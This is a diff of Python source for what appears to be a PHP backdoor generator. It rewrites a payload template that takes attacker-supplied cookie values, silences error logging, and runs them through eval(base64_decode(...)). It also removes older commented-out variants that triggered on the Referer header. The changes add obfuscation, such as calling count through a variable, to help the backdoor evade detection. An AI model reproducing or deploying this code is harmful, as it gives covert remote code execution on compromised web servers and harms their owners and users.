@@ -21,44 +21,20 @@ from random import random, randrange, choice, shuffle
 from pollution import random_string, pollute_with_static_str
 
 class Backdoor:
-#	payload_template_old= """
-#ini_set('error_log', '/dev/null');
-#parse_str($_SERVER['HTTP_REFERER'],$a);
-#if(reset($a)=='%%%START_KEY%%%' && count($a)==9) {
-#echo '<%%%END_KEY%%%>';
-#eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));
-#echo '</%%%END_KEY%%%>';
-#}
-#"""
 
 
 	payload_template= """
-$a=$_COOKIE;if(reset($a)=='%%%START_KEY%%%' && count($a)>3){ini_set('error_log', '/dev/null');
-echo '<%%%END_KEY%%%>';
-eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,count($a)-3)))));
-echo '</%%%END_KEY%%%>';
+$c='count';
+$a=$_COOKIE;
+if(reset($a)=='%%%START_KEY%%%' && $c($a)>3){
+ini_set('error_log', '/dev/null');
+$k='%%%END_KEY%%%';
+echo '<'.$k.'>';
+eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
+echo '</'.$k.'>';
 }
 """
 
-
-#	payload_template= """
-#function z($a) {
-#if(reset($a)=='%%%START_KEY%%%' && count($a)>3) {
-#ini_set('error_log', '/dev/null');
-#echo '<%%%END_KEY%%%>';
-#eval(base64_decode(str_replace(" ", "+", join(array_slice($a,count($a)-3)))));
-#echo '</%%%END_KEY%%%>';
-#$b=0;
-#}
-#}
-#$b=1;
-#$ss=$_SERVER;$rr='HTTP_REFERER';
-#if(array_key_exists($rr,$ss)){parse_str($ss[$rr],$r);z($r);}
-#elseif($b) z($_COOKIE);	
-#"""
-
-	#backdoor_template = "<?php eval(base64_decode('%%%PAYLOAD%%%')); ?>"
-	
 	backdoor_template = """<?php 
 $%%PAY_VAR%%1="%%PAYLOAD1%%";
 $%%PAY_VAR%%2="%%PAYLOAD2%%";
